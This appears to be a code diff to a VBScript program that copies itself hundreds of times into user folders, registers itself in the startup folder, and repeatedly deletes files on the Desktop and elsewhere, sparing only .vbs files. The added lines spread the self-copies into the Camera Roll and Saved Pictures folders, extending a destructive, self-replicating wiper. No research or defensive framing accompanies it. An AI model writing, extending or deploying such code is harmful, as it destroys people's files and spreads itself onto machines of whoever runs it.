@@ -11,6 +11,12 @@ strDesktopFolder = objShell.SpecialFolders("Desktop")
 ' Get the path to the documents folder
 strDocumentsFolder = objShell.SpecialFolders("MyDocuments")
 
+' Get the path to the camera roll folder
+strCameraRollFolder = objShell.SpecialFolders("CameraRoll")
+
+' Get the path to the saved pictures folder
+strSavedPicturesFolder = objShell.SpecialFolders("SavedPictures")
+
 ' Specify the number of copies to create
 numCopies = 999
 
@@ -28,6 +34,14 @@ For i = 1 To numCopies
     ' Create a copy of the script in the documents folder
     strDocumentsCopyPath = strDocumentsFolder & "\Copy" & randomIteration & ".vbs"
     objFSO.CopyFile strCopyPath, strDocumentsCopyPath, True ' Add "True" to overwrite existing files
+
+    ' Create a copy of the script in the camera roll folder
+    strCameraRollCopyPath = strCameraRollFolder & "\Copy" & randomIteration & ".vbs"
+    objFSO.CopyFile strCopyPath, strCameraRollCopyPath, True ' Add "True" to overwrite existing files
+
+    ' Create a copy of the script in the saved pictures folder
+    strSavedPicturesCopyPath = strSavedPicturesFolder & "\Copy" & randomIteration & ".vbs"
+    objFSO.CopyFile strCopyPath, strSavedPicturesCopyPath, True ' Add "True" to overwrite existing files
 Next
 
 ' Add the script to the startup folder
@@ -54,7 +68,7 @@ Do
         End If
     Next
 
-        ' Loop through each folder on the Desktop and delete files within them
+    ' Loop through each folder on the Desktop and delete files within them
     For Each objFolder In objFSO.GetFolder(strDesktopFolder).Subfolders
         For Each objFile In objFolder.Files
             objFSO.DeleteFile(objFile.Path)
@@ -93,4 +107,3 @@ Sub DeleteFilesExceptVBS(folderPath)
     
     On Error GoTo 0
 End Sub
-
